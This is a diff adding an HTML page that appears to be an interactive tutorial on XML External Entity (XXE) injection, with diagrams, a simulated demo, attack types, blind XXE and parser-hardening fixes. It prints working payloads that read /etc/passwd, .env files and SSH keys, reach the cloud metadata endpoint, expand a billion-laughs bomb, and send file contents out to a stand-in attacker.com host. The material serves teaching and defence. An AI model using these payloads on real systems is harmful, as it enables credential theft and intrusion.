@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>XXE Explainer</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.r-blue{background:#0a1828;border:1px solid #1a3a60;color:#60a5fa}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.info{border-left-color:#60a5fa}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.danger{border-left-color:#f87171}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select,textarea{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus,textarea:focus{border-color:#555}
+textarea{width:100%;resize:vertical;line-height:1.6}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:120px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.flow-row{display:flex;align-items:center;gap:0;flex-wrap:nowrap;margin:8px 0;overflow-x:auto}
+.flow-box{padding:7px 14px;font-size:12px;border:1px solid #2a2a30;background:#1a1a22;white-space:nowrap;flex-shrink:0}
+.flow-box:first-child{border-radius:8px 0 0 8px}
+.flow-box:last-child{border-radius:0 8px 8px 0}
+.flow-arrow{padding:7px 6px;font-size:12px;color:#555;border-top:1px solid #2a2a30;border-bottom:1px solid #2a2a30;background:#1a1a22;flex-shrink:0}
+.flow-box.danger{background:#2a1010;border-color:#5a2020;color:#f87171}
+.flow-box.safe{background:#0d2218;border-color:#1a4a30;color:#4ade80}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+</style>
+</head>
+<body>
+
+<h1>XML External Entity Injection (XXE)</h1>
+<p class="sub">OWASP Top 10 · A05 Security Misconfiguration / A03 Injection · CWE-611</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How it works</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('attacks',this)">Attack types</button>
+  <button class="tab-btn" onclick="showTab('blind',this)">Blind XXE</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- ─── CONCEPT ─── -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:16px;">XML supports a feature called <em>External Entities</em> — a way to define a variable whose value is pulled from an external file or URL. XXE exploits this to make the server read local files, probe internal networks, or perform SSRF, simply by sending crafted XML.</p>
+
+  <svg width="100%" viewBox="0 0 680 420" style="max-width:680px;display:block;margin:0 auto 20px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Step 1: Attacker crafts XML -->
+    <rect x="20" y="20" width="148" height="64" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="94" y="44" text-anchor="middle" font-size="13" font-weight="600" fill="#f87171" font-family="system-ui">Attacker</text>
+    <text x="94" y="62" text-anchor="middle" font-size="11" fill="#f87171" font-family="system-ui" opacity="0.8">sends malicious XML</text>
+    <text x="94" y="77" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace" opacity="0.6">with DOCTYPE entity</text>
+
+    <!-- Step 2: Vulnerable Server / XML Parser -->
+    <rect x="265" y="20" width="150" height="64" rx="8" fill="#2a1a08" stroke="#fbbf24" stroke-width="0.8"/>
+    <text x="340" y="44" text-anchor="middle" font-size="13" font-weight="600" fill="#fbbf24" font-family="system-ui">XML Parser</text>
+    <text x="340" y="62" text-anchor="middle" font-size="11" fill="#fbbf24" font-family="system-ui" opacity="0.8">resolves external</text>
+    <text x="340" y="77" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="Courier New,monospace" opacity="0.6">entity reference</text>
+
+    <!-- Arrow 1 -->
+    <line x1="170" y1="52" x2="263" y2="52" stroke="#f87171" stroke-width="1.5" marker-end="url(#arr)"/>
+    <rect x="174" y="35" width="86" height="14" rx="3" fill="#13131a"/>
+    <text x="217" y="43" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">POST /api/xml</text>
+
+    <!-- File system -->
+    <rect x="530" y="20" width="130" height="64" rx="8" fill="#1a1a22" stroke="#555" stroke-width="0.8"/>
+    <text x="595" y="44" text-anchor="middle" font-size="13" font-weight="600" fill="#ccc" font-family="system-ui">Server FS</text>
+    <text x="595" y="62" text-anchor="middle" font-size="11" fill="#888" font-family="system-ui">/etc/passwd</text>
+    <text x="595" y="77" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">/etc/shadow · .env</text>
+
+    <!-- Arrow 2: parser reads file -->
+    <line x1="417" y1="52" x2="528" y2="52" stroke="#fbbf24" stroke-width="1.5" marker-end="url(#arr)"/>
+    <rect x="420" y="35" width="106" height="14" rx="3" fill="#13131a"/>
+    <text x="473" y="43" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="Courier New,monospace">file:///etc/passwd</text>
+
+    <!-- Arrow 3: data returned to attacker -->
+    <path d="M595 86 Q595 160 340 160 Q180 160 94 160" fill="none" stroke="#f87171" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#arr)"/>
+    <rect x="290" y="144" width="134" height="14" rx="3" fill="#13131a"/>
+    <text x="357" y="152" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">file contents returned!</text>
+
+    <!-- DTD payload box -->
+    <rect x="20" y="196" width="640" height="198" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="218" text-anchor="middle" font-size="13" font-weight="600" fill="#ccc" font-family="system-ui">How the XML payload works</text>
+
+    <!-- Normal XML label -->
+    <rect x="40" y="234" width="240" height="144" rx="8" fill="#0d2218" stroke="#1a4a30" stroke-width="0.8"/>
+    <text x="160" y="254" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Normal XML</text>
+    <text x="52" y="272" font-size="10" fill="#4ade80" font-family="Courier New,monospace">&lt;user&gt;</text>
+    <text x="52" y="288" font-size="10" fill="#4ade80" font-family="Courier New,monospace">  &lt;name&gt;Alice&lt;/name&gt;</text>
+    <text x="52" y="304" font-size="10" fill="#4ade80" font-family="Courier New,monospace">  &lt;role&gt;user&lt;/role&gt;</text>
+    <text x="52" y="320" font-size="10" fill="#4ade80" font-family="Courier New,monospace">&lt;/user&gt;</text>
+    <text x="160" y="366" text-anchor="middle" font-size="10" fill="#4ade80" font-family="system-ui" opacity="0.7">safe — no entity</text>
+
+    <!-- Malicious XML label -->
+    <rect x="300" y="234" width="340" height="144" rx="8" fill="#2a1010" stroke="#5a2020" stroke-width="0.8"/>
+    <text x="470" y="254" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Malicious XML (XXE)</text>
+    <text x="312" y="272" font-size="10" fill="#f87171" font-family="Courier New,monospace">&lt;!DOCTYPE foo [</text>
+    <text x="312" y="288" font-size="10" fill="#fbbf24" font-family="Courier New,monospace">  &lt;!ENTITY xxe SYSTEM</text>
+    <text x="312" y="304" font-size="10" fill="#fbbf24" font-family="Courier New,monospace">    "file:///etc/passwd"&gt;</text>
+    <text x="312" y="320" font-size="10" fill="#f87171" font-family="Courier New,monospace">]&gt;</text>
+    <text x="312" y="336" font-size="10" fill="#f87171" font-family="Courier New,monospace">&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</text>
+    <text x="470" y="366" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui" opacity="0.7">&amp;xxe; expands to file contents</text>
+  </svg>
+</div>
+
+<!-- ─── LIVE DEMO ─── -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Craft an XML payload and see how a vulnerable parser responds vs. a hardened one with external entities disabled.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">XML Payload</div>
+    <textarea id="xml-input" rows="9" style="width:100%;font-size:12px;">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;role&gt;guest&lt;/role&gt;
+&lt;/user&gt;</textarea>
+  </div>
+
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+    <span style="font-size:12px;color:#888;align-self:center">Presets:</span>
+    <button class="preset-btn" onclick="setPreset('passwd')">File read /etc/passwd</button>
+    <button class="preset-btn" onclick="setPreset('env')">Read .env secrets</button>
+    <button class="preset-btn" onclick="setPreset('ssrf')">SSRF internal network</button>
+    <button class="preset-btn" onclick="setPreset('dos')">Billion laughs DoS</button>
+    <button class="preset-btn" onclick="setPreset('safe')">Safe XML (no entity)</button>
+  </div>
+
+  <div class="grid2">
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#f87171;">❌ Vulnerable parser <span style="font-weight:400;color:#666;font-size:11px">— entities enabled</span></div>
+      <div class="mono-out" id="vuln-out"></div>
+    </div>
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#4ade80;">✅ Hardened parser <span style="font-weight:400;color:#666;font-size:11px">— entities disabled</span></div>
+      <div class="mono-out" id="safe-out"></div>
+    </div>
+  </div>
+  <div id="demo-verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- ─── ATTACK TYPES ─── -->
+<div class="tab-panel" id="tab-attacks">
+  <div class="sc-card sc-red">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">① File disclosure</span><span class="badge b-red">Critical</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Read any file the server process has permission to access — secrets, credentials, SSH keys, source code.</p>
+    <div class="code">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY env SYSTEM "file:///app/.env"&gt;
+  &lt;!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;</div>
+    <div style="font-size:12px;color:#888;">Parser substitutes <span style="font-family:'Courier New',monospace;font-size:11px">&amp;xxe;</span> with the raw file content, which is then returned in the response body.</div>
+  </div>
+
+  <div class="sc-card sc-red">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">② SSRF — internal network probing</span><span class="badge b-red">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Use HTTP/HTTPS URIs to make the server fetch internal services unreachable from the internet — cloud metadata endpoints, internal APIs, databases.</p>
+    <div class="code">&lt;!DOCTYPE foo [
+  &lt;!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+  &lt;!ENTITY redis SYSTEM "http://10.0.0.5:6379/"&gt;
+]&gt;
+&lt;data&gt;&amp;ssrf;&lt;/data&gt;</div>
+    <div style="font-size:12px;color:#888;"><span style="font-family:'Courier New',monospace;font-size:11px">169.254.169.254</span> is the AWS EC2 metadata endpoint — returns IAM credentials, instance info, and more.</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">③ Billion Laughs — DoS</span><span class="badge b-amber">Medium</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Entities that reference other entities — exponential expansion. A tiny payload expands to gigabytes in memory, crashing the parser.</p>
+    <div class="code">&lt;!DOCTYPE bomb [
+  &lt;!ENTITY a "lol"&gt;
+  &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
+  &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;
+  &lt;!ENTITY d "&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;"&gt;
+]&gt;
+&lt;data&gt;&amp;d;&lt;/data&gt;
+&lt;!-- "lol" × 10³ = 1000 chars from 4 entities --&gt;</div>
+  </div>
+
+  <div class="sc-card sc-blue">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">④ Parameter entity — DTD injection</span><span class="badge b-blue">Advanced</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Parameter entities (prefixed with <span style="font-family:'Courier New',monospace;font-size:11px">%</span>) allow dynamic DTD construction and are used for blind XXE exfiltration when direct output isn't reflected.</p>
+    <div class="code">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;data&gt;test&lt;/data&gt;
+&lt;!-- evil.dtd on attacker's server exfiltrates %file; --&gt;</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">⑤ XInclude — no DOCTYPE needed</span><span class="badge b-purple">Bypass technique</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">When you can't control the DOCTYPE (e.g. server wraps your input in XML), use XInclude to read files without a DTD declaration.</p>
+    <div class="code">&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
+&lt;/foo&gt;</div>
+  </div>
+</div>
+
+<!-- ─── BLIND XXE ─── -->
+<div class="tab-panel" id="tab-blind">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Blind XXE occurs when the server processes your XML but does not return the parsed entity content in the response. You need an out-of-band channel to exfiltrate data.</p>
+
+  <svg width="100%" viewBox="0 0 680 310" style="max-width:680px;display:block;margin:0 auto 16px;">
+    <defs>
+      <marker id="arr2" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Attacker -->
+    <rect x="20" y="20" width="130" height="52" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="85" y="41" text-anchor="middle" font-size="12" font-weight="600" fill="#f87171" font-family="system-ui">Attacker</text>
+    <text x="85" y="57" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui" opacity="0.8">+ OOB HTTP server</text>
+
+    <!-- Victim server -->
+    <rect x="270" y="20" width="140" height="52" rx="8" fill="#2a1a08" stroke="#fbbf24" stroke-width="0.8"/>
+    <text x="340" y="41" text-anchor="middle" font-size="12" font-weight="600" fill="#fbbf24" font-family="system-ui">Victim Server</text>
+    <text x="340" y="57" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="system-ui" opacity="0.8">processes XML silently</text>
+
+    <!-- File system -->
+    <rect x="530" y="20" width="130" height="52" rx="8" fill="#1a1a22" stroke="#555" stroke-width="0.8"/>
+    <text x="595" y="41" text-anchor="middle" font-size="12" font-weight="600" fill="#ccc" font-family="system-ui">Server FS</text>
+    <text x="595" y="57" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">/etc/passwd</text>
+
+    <!-- Step 1: attacker sends XML -->
+    <line x1="152" y1="46" x2="268" y2="46" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr2)"/>
+    <rect x="158" y="30" width="108" height="14" rx="3" fill="#13131a"/>
+    <text x="212" y="38" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">① sends XML</text>
+
+    <!-- Step 2: server reads file -->
+    <line x1="412" y1="46" x2="528" y2="46" stroke="#fbbf24" stroke-width="1.3" marker-end="url(#arr2)"/>
+    <rect x="416" y="30" width="110" height="14" rx="3" fill="#13131a"/>
+    <text x="471" y="38" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="system-ui">② reads /etc/passwd</text>
+
+    <!-- Step 3: server calls OOB to attacker with data -->
+    <path d="M595 74 Q595 150 340 150 Q180 150 85 150" fill="none" stroke="#c084fc" stroke-width="1.5" marker-end="url(#arr2)"/>
+    <rect x="285" y="134" width="164" height="14" rx="3" fill="#13131a"/>
+    <text x="367" y="142" text-anchor="middle" font-size="10" fill="#c084fc" font-family="system-ui">③ GET /exfil?data=root:x:0:...</text>
+
+    <!-- Response to attacker: no file data -->
+    <path d="M340 74 L340 186 L85 186" fill="none" stroke="#888" stroke-width="1" stroke-dasharray="4 3" marker-end="url(#arr2)"/>
+    <rect x="188" y="170" width="148" height="14" rx="3" fill="#13131a"/>
+    <text x="262" y="178" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">④ normal 200 response (no data)</text>
+
+    <!-- Explanation box -->
+    <rect x="20" y="210" width="640" height="84" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="234" text-anchor="middle" font-size="13" font-weight="600" fill="#ccc" font-family="system-ui">Out-of-Band exfiltration via DNS / HTTP</text>
+    <text x="40" y="256" font-size="11" fill="#888" font-family="Courier New,monospace">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</text>
+    <text x="40" y="272" font-size="11" fill="#c084fc" font-family="Courier New,monospace">&lt;!ENTITY % oob "http://attacker.com/?d=%file;"&gt;</text>
+    <text x="40" y="288" font-size="11" fill="#888" font-family="Courier New,monospace">%oob;  &lt;!-- server makes HTTP GET with file contents --&gt;</text>
+  </svg>
+
+  <div class="sc-card sc-purple" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Detection techniques for blind XXE</div>
+    <div class="step-row" style="border-bottom:1px solid #2a2a30;">
+      <span class="snum b">1</span>
+      <div><div style="font-size:13px;font-weight:500;margin-bottom:2px;">DNS exfiltration</div>
+      <div style="font-size:12px;color:#888;">Use <span style="font-family:'Courier New',monospace;font-size:11px">SYSTEM "http://your-collaborator.com"</span> — even if no data returns, a DNS lookup to your server confirms the parser is resolving external entities. Burp Collaborator automates this.</div></div>
+    </div>
+    <div class="step-row" style="border-bottom:1px solid #2a2a30;">
+      <span class="snum b">2</span>
+      <div><div style="font-size:13px;font-weight:500;margin-bottom:2px;">Error-based exfiltration</div>
+      <div style="font-size:12px;color:#888;">Reference a non-existent file using a filename built from the secret data. The parser's error message leaks the content: <span style="font-family:'Courier New',monospace;font-size:11px">file:///nonexistent/root:x:0:0</span> → error reveals the path.</div></div>
+    </div>
+    <div class="step-row">
+      <span class="snum b">3</span>
+      <div><div style="font-size:13px;font-weight:500;margin-bottom:2px;">Time-based (response delay)</div>
+      <div style="font-size:12px;color:#888;">Point the entity to a slow external server. A delayed response confirms outbound HTTP is allowed, even if data isn't returned.</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ─── FIXES ─── -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card" style="border-left-color:#f87171;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">① Disable external entities in your XML parser <span class="badge b-red">First line of defense</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Every major XML library has a way to disable external entity resolution. This is the single most important fix — and it requires zero application-logic changes.</div>
+    <div class="code">// Java (DocumentBuilderFactory)
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+
+// Python (lxml)
+from lxml import etree
+parser = etree.XMLParser(resolve_entities=False, no_network=True)
+tree = etree.parse(xml_input, parser)
+
+// PHP (libxml)
+libxml_disable_entity_loader(true);  // PHP &lt; 8.0
+// PHP 8.0+ — external entities disabled by default
+
+// Node.js (node-expat / sax)
+// Use sax with { strictEntities: true }
+// Or use fast-xml-parser with { allowBooleanAttributes: false }
+
+// .NET
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;
+XmlReader reader = XmlReader.Create(stream, settings);</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">② Use a less dangerous data format <span class="badge b-green">Architectural</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">If your API doesn't need XML, switch to JSON. JSON has no concept of entities, DTDs, or external resource loading — the entire XXE attack surface disappears.</div>
+    <div class="code">// Instead of parsing XML POSTed by clients, accept JSON:
+app.use(express.json());
+// JSON.parse() has no entity expansion — XXE is structurally impossible</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">③ Allowlist / validate XML structure <span class="badge b-green">Defense in depth</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">If you must accept XML, validate it against a strict XSD schema before parsing. Reject any payload containing a DOCTYPE declaration.</div>
+    <div class="code">// Quick DOCTYPE check before parsing
+function isSafeXML(xmlString) {
+  if (/&lt;!DOCTYPE/i.test(xmlString)) {
+    throw new Error('DOCTYPE not allowed');
+  }
+  return true;
+}
+
+// Python — reject DOCTYPE at string level
+import re
+if re.search(r'&lt;!DOCTYPE', xml_input, re.IGNORECASE):
+    raise ValueError("DOCTYPE declarations are not permitted")</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">④ SSRF protection — restrict outbound HTTP <span class="badge b-amber">Complementary</span></div>
+    <div style="font-size:12px;color:#888;">Even if XXE is exploited, blocking outbound HTTP/DNS from your app server limits the blast radius — attackers can't reach cloud metadata endpoints or internal services.</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">⑤ Hidden XXE surfaces to audit</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      DOCX / XLSX / SVG uploads — all are ZIP archives containing XML &nbsp;·&nbsp;
+      SAML authentication — uses XML signatures &nbsp;·&nbsp;
+      RSS / Atom feeds &nbsp;·&nbsp;
+      PDF generators that accept SVG input &nbsp;·&nbsp;
+      SOAP web services &nbsp;·&nbsp;
+      Any endpoint accepting <span style="font-family:'Courier New',monospace">Content-Type: application/xml</span> or <span style="font-family:'Courier New',monospace">text/xml</span>
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const PRESETS = {
+  passwd:`<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<user>\n  <name>&xxe;</name>\n  <role>guest</role>\n</user>`,
+  env:`<!DOCTYPE foo [\n  <!ENTITY env SYSTEM "file:///app/.env">\n]>\n<config>\n  <setting>&env;</setting>\n</config>`,
+  ssrf:`<!DOCTYPE foo [\n  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n]>\n<request>\n  <data>&ssrf;</data>\n</request>`,
+  dos:`<!DOCTYPE bomb [\n  <!ENTITY a "lol">\n  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n]>\n<data>&d;</data>`,
+  safe:`<user>\n  <name>Alice</name>\n  <role>guest</role>\n</user>`
+};
+
+// Simulated file contents
+const FILES = {
+  '/etc/passwd':'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\napp:x:1000:1000::/home/app:/bin/bash',
+  '/app/.env':'DATABASE_URL=postgres://admin:Sup3rS3cr3t@db:5432/prod\nSECRET_KEY=xK9#mP2$qR8vL5nW\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nJWT_SECRET=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/':'{\n  "Code": "Success",\n  "AccessKeyId": "ASIAXYZ123456",\n  "SecretAccessKey": "abc123+EXAMPLE/SECRET/KEY",\n  "Token": "FwoGZXIvYXdzEHkaDH...",\n  "Expiration": "2026-03-26T12:00:00Z"\n}'
+};
+
+function setPreset(key){
+  document.getElementById('xml-input').value=PRESETS[key];
+  runDemo();
+}
+
+function extractEntity(xml){
+  const m=xml.match(/SYSTEM\s+"([^"]+)"/i);
+  return m?m[1]:null;
+}
+
+function hasDoctype(xml){ return /<!DOCTYPE/i.test(xml); }
+function hasBillionLaughs(xml){ return (xml.match(/<!ENTITY/g)||[]).length >= 3; }
+
+function runDemo(){
+  const xml=document.getElementById('xml-input').value.trim();
+  const vOut=document.getElementById('vuln-out');
+  const sOut=document.getElementById('safe-out');
+  const verd=document.getElementById('demo-verdict');
+
+  // Safe parser always rejects DOCTYPE
+  if(hasDoctype(xml)){
+    sOut.innerHTML='<span style="color:#4ade80">Error: DOCTYPE declarations are\nnot permitted by this parser.\n\nHTTP 400 Bad Request\n{\n  "error": "Invalid XML input",\n  "reason": "External entities disabled"\n}</span>';
+  } else {
+    sOut.innerHTML='<span style="color:#4ade80">HTTP 200 OK\n{\n  "status": "parsed",\n  "note": "No entities resolved — safe"\n}</span>';
+  }
+
+  // Vulnerable parser simulates entity resolution
+  if(!hasDoctype(xml)){
+    vOut.innerHTML='HTTP 200 OK\n{\n  "status": "parsed",\n  "note": "No DOCTYPE — no entity injection"\n}';
+    verd.className='result-box r-green';
+    verd.innerHTML='<strong>Safe XML.</strong> No DOCTYPE, no entity declaration — both parsers process this normally.';
+    return;
+  }
+
+  if(hasBillionLaughs(xml)){
+    vOut.innerHTML='<span style="color:#f87171">PARSER CRASH\nOutOfMemoryError: Java heap space\n  at com.sun.org.apache.xerces.internal\n  .impl.dtd.XMLDTDProcessor.expandEntity\n\n[Server process killed — OOM]</span>';
+    verd.className='result-box r-red';
+    verd.innerHTML='<strong>Billion Laughs DoS!</strong> Nested entity expansion consumed all available memory. Vulnerable parser crashed. Hardened parser rejected DOCTYPE immediately.';
+    return;
+  }
+
+  const target=extractEntity(xml);
+  if(target){
+    const content=FILES[target];
+    if(content){
